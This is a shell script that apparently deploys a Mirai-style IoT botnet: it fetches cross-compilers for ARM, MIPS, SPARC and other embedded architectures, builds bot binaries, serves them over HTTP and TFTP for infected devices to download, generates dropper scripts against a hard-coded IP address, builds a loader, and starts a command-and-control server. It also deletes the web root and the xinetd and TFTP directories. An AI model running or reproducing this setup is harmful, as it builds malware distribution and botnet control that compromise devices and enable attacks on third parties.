#!/bin/sh
#./build.sh release Acid; cp release/* /var/www/html/
apt update -y
apt install wget curl apache2 xinetd tftpd tftp gcc screen nano -y
mkdir cross-compilers
mkdir release
rm -rf /var/www/html/*
cd cross-compilers
wget https://cdn.discordapp.com/attachments/849107215688531988/852721191264583740/cross-compiler-armv4l.tar.bz2
wget https://cdn.discordapp.com/attachments/849107215688531988/852721887287967785/cross-compiler-armv5l.tar.bz2
wget https://cdn.discordapp.com/attachments/842399079668514878/842399656973172786/cross-compiler-armv6l.tar.bz2
wget https://cdn.discordapp.com/attachments/737802958800158741/748823939442278400/cross-compiler-armv7l.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231835389165568/cross-compiler-m68k.tar.bz2
wget https://cdn.discordapp.com/attachments/849107215688531988/852719670989029416/cross-compiler-mips.tar.bz2
wget https://cdn.discordapp.com/attachments/849107215688531988/852720517382930492/cross-compiler-mipsel.tar.bz2
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231594896818227/cross-compiler-sh4.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231910685835264/cross-compiler-sparc.tar.bz2
wget https://cdn.discordapp.com/attachments/849107215688531988/852717482229497916/cross-compiler-x86_64.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2
rm *.tar.bz2
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-x86_64 x86_64
rm -rf /etc/xinetd.d/
mkdir /etc/xinetd.d/
rm -rf /tftpboot
mkdir /tftpboot
cd /root/$1
chmod +x *
./build.sh debug $1
./build.sh release $1
cd /root/$1/tools
chmod +x *
#./upx --ultra-brute /root/$1/release/*
mv /root/$1/bins/$1.dbg /var/www/html
cp /root/$1/bins/* /var/www/html
cp /root/$1/bins/* /tftpboot
gcc cc.c -o cc -Wall -Wextra -std=c99
./cc 149.57.168.228
mv /root/$1/tools/wget.sh /var/www/html
mv /root/$1/tools/curl.sh /var/www/html
mv /root/$1/tools/tftp.sh /tftpboot
mv /root/$1/tools/Payload.txt /root/$1
cd /root/$1/dlr
chmod +x *
./build.sh $1
cd /root/$1/loader
chmod +x *
./build.sh
cp /root/$1/dlr/release/* bins/
systemctl restart xinetd.service
cd /root/$1/c2
ulimit -n 999999;
screen ./cnc
